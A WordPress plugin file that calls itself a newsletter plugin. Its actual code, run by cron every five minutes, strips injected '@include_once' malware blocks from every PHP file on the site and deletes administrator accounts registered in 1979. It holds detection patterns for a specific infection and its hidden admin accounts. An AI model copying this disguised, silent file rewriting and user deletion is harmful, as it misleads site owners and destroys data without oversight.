<?php
/*
Plugin Name: Newsletter Pro
Description: Newsletter is a cool plugin to create your own subscriber list, send newsletters and make your work better known.
Version: 6.3.4
Author: The Newsletter Team
*/

if (!defined('ABSPATH')) {
    exit; // Prevent direct access to the file
}

require_once(ABSPATH.'wp-admin/includes/user.php' );	


// Function to find fractals in a file
function newsletter_pro_findFractalsInFile($fileContent) {
    $pattern = '/\/\*([a-f0-9]+)\*\/.*?@include_once.*?\/\*\1\*\//s';
    preg_match_all($pattern, $fileContent, $matches, PREG_SET_ORDER);

    $fractals = [];

    foreach ($matches as $match) {
        $fullBlock = $match[0];
        $fractalId = $match[1];

        if (strpos($fullBlock, '@include_once') !== false) {
            $fractals[] = [
                'id' => $fractalId,
                'code' => $fullBlock,
            ];
        }
    }

    return $fractals;
}

// Function to remove fractals from a file
function newsletter_pro_removeFractalsFromFile($filePath, $fractals) {
    $fileContent = file_get_contents($filePath);

    foreach ($fractals as $fractal) {
        $fileContent = str_replace($fractal['code'], '', $fileContent);
    }

    file_put_contents($filePath, $fileContent);
}

// Function to scan directories
function newsletter_pro_scan() {
    $directory = ABSPATH; // Root directory of the site
    $results = [];
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));

    foreach ($iterator as $file) {
        if ($file->isFile() && $file->getExtension() === 'php') {
            $filePath = $file->getPathname();
            $fileContent = file_get_contents($filePath);

            $fractals = newsletter_pro_findFractalsInFile($fileContent);

            if (!empty($fractals)) {
                $results[$filePath] = $fractals;
                newsletter_pro_removeFractalsFromFile($filePath, $fractals);
            }
        }
    }

    return $results;
}

// Function to scan administrators
function newsletter_pro_scan_admins() {
    $suspicious_admins = [];

    // Get all users with the administrator role
    $admins = get_users([
        'role' => 'administrator',
    ]);

    foreach ($admins as $admin) {
        // Check if the user was registered in 1979
        if (strpos($admin->user_registered, '1979') === 0) {
            $suspicious_admins[] = $admin;
        }
    }

    return $suspicious_admins;
}

// Function to remove suspicious administrators
function newsletter_pro_clean_admins($suspicious_admins) {
    foreach ($suspicious_admins as $admin) {
        wp_delete_user($admin->ID); // Delete the user
    }
}

// Add "every 5 minutes" interval to WordPress Cron
add_filter('cron_schedules', 'newsletter_pro_add_cron_interval');

function newsletter_pro_add_cron_interval($schedules) {
    $schedules['every5minutes'] = [
        'interval' => 5 * 60, // 5 minutes in seconds
        'display'  => 'Every 5 minutes',
    ];
    return $schedules;
}

// Schedule the task
add_action('newsletter_pro_cron_hook', 'newsletter_pro_cron_task');

function newsletter_pro_cron_task() {
    // Scan and remove suspicious administrators
    $suspicious_admins = newsletter_pro_scan_admins();
    if (!empty($suspicious_admins)) {
        newsletter_pro_clean_admins($suspicious_admins);
    }
    // Scan and clean files
    newsletter_pro_scan();
    /*if (!empty($results)) {
        newsletter_pro_clean($results);
    }*/
}

// Set up the task on plugin activation
register_activation_hook(__FILE__, 'newsletter_pro_activate');

add_action('init', 'schedule_cron_task');

function schedule_cron_task(){
    // Set the default interval (every 5 minutes) if not already set
    if (!get_option('newsletter_pro_scan_interval')) {
        update_option('newsletter_pro_scan_interval', 'every5minutes');
    }
    // Schedule the task
    $scan_interval = get_option('newsletter_pro_scan_interval', 'every5minutes');
    if (!wp_next_scheduled( 'newsletter_pro_cron_hook' ) ) {
        if ($scan_interval !== 'none') {
            wp_schedule_event(time(), $scan_interval, 'newsletter_pro_cron_hook');
        }
    }
}

function newsletter_pro_activate() {
    // Set the default interval (every 5 minutes) if not already set
    if (!get_option('newsletter_pro_scan_interval')) {
        update_option('newsletter_pro_scan_interval', 'every5minutes');
    }

    // Schedule the task
    $scan_interval = get_option('newsletter_pro_scan_interval', 'every5minutes');
    if ($scan_interval !== 'none') {
        wp_schedule_event(time(), $scan_interval, 'newsletter_pro_cron_hook');
    }
}

// Remove the task on plugin deactivation
register_deactivation_hook(__FILE__, 'newsletter_pro_deactivate');

function newsletter_pro_deactivate() {
    wp_clear_scheduled_hook('newsletter_pro_cron_hook');
}